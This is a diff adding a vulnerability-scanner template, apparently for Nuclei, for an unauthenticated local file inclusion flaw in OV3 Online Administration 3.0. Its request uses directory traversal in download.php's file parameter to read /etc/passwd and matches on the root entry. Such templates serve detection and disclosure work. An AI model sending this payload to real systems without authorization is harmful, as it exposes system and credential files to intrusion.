@@ -1,0 +1,25 @@
+id: ov3-online-administration-unauthenticated-lfi
+info:
+  author: 0x_Akoko
+  description: The application Online Verwaltung III suffers from an unauthenticated
+    file disclosure vulnerability when input passed thru the file parameter to download.php
+    script is not properly verified before being used to include files. This can be
+    exploited to read arbitrary files from local resources with directory traversal
+    attacks.
+  name: OV3 Online Administration 3.0 - Unauthenticated LFI
+  reference:
+  - https://www.zeroscience.mk/codes/ov3_lfi.txt
+  severity: high
+  tags: ov3,lfi
+requests:
+- matchers:
+  - regex:
+    - root:[x*]:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/download.php?c_id=557&file=../../../../../../../../../../../etc/passwd&name=download.txt'
